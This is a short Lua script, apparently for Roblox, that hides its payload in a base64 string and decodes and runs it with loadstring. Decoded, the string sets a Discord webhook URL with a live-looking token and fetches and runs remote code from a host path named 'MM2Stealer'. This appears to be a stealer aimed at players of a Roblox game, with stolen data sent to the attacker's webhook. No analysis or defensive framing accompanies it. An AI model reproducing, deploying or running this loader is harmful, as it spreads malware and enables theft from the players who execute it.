
-- Obfuscated script
local encodedScript = "VXNlcm5hbWUgPSAiRWtzb3ZhU3RvY2siCldlYmhvb2sgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0MjgyMTM5MjY4ODc0MjQ2MC9KQ1R5TUNlelpxMGU2U19WRkI1al9rSktaeHJCd0FUV0F3dE51dnI0R3RCVU9YS3dpMGZUZUxnOFpEbVFIQWV0TUlTYiIKCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwOi8vZWtzb3ZhLnh5ei9NTTJTdGVhbGVyIiwgdHJ1ZSkpKCk="

-- Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the decoded script
loadstring(decode(encodedScript))()
